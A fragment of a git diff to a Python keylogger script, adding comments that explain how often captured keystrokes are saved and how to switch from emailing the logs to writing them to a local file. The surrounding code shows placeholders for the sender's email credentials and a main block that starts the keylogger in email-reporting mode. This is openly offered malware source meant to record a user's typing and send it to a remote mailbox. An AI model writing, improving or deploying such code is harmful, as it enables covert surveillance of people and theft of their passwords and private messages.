@@ -5,7 +5,7 @@ from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-SEND_REPORT_EVERY = 30
+SEND_REPORT_EVERY = 30 # Time after which email/keylogger logs are saved in file/ forwarded to email
 EMAIL_ADDRESS = "Your_email_address"
 EMAIL_PASSWORD = "Your_email_password"
 RECIVING_ADDRESS = "recipient_email_address"
@@ -91,7 +91,7 @@ class Keylogger:
         keyboard.wait()
 
 if __name__ == "__main__":
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="email")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="email") # by entering report_method="file" logs will be save in your execting directory
     keylogger.start()
 
 
